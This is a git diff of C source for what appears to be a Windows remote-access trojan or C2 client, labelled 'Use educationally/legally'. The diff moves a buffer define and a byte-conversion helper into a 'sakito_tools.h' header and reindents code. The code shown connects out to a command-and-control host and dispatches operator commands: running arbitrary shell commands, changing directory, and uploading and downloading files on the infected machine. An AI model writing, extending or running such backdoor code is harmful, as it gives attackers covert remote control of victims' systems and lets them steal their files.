@@ -7,12 +7,9 @@ Use educationally/legally.
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include "sakito_tools.h"
 
 #pragma comment(lib, "Ws2_32.lib")
-
-// Length of network buffer.
-#define BUFLEN 8192
-
 
 // Function to create connect socket.
 const SOCKET create_socket() {
@@ -49,15 +46,6 @@ int c2_connect(const SOCKET connect_socket, const char* host, const int port) {
 	}
 
 	return 1;
-}
-
-// Function to copy int bytes to new memory block/location to abide strict aliasing.
-inline uint32_t ntohl_conv(char* const buf) {
-	uint32_t new;
-	memcpy(&new, buf, sizeof(new));
-
-	// Return deserialized bytes.
-	return ntohl(new);
 }
 
 // Function to receive file from client (TCP file transfer).
@@ -200,24 +188,24 @@ int main(void) {
 
 				// buf[0] is the command code and &buf[1] is the parsed data.
 				switch (buf[0]) {
-					case '0':
-						iResult = exec_cmd(connect_socket, &buf[1]);
-						break;
-					case '1':
-						// Change directory.
-						_chdir(&buf[1]);
-						break;
-					case '2':
-						// Exit.
-						return 0;
-					case '3':
-						// Upload file to client system.
-						iResult = recv_file(buf, &buf[1], connect_socket);
-						break;
-					case '4':
-						// Download file from client system.
-						iResult = send_file(&buf[1], connect_socket, buf);
-						break;
+				case '0':
+					iResult = exec_cmd(connect_socket, &buf[1]);
+					break;
+				case '1':
+					// Change directory.
+					_chdir(&buf[1]);
+					break;
+				case '2':
+					// Exit.
+					return 0;
+				case '3':
+					// Upload file to client system.
+					iResult = recv_file(buf, &buf[1], connect_socket);
+					break;
+				case '4':
+					// Download file from client system.
+					iResult = send_file(&buf[1], connect_socket, buf);
+					break;
 				}
 			}
 		}
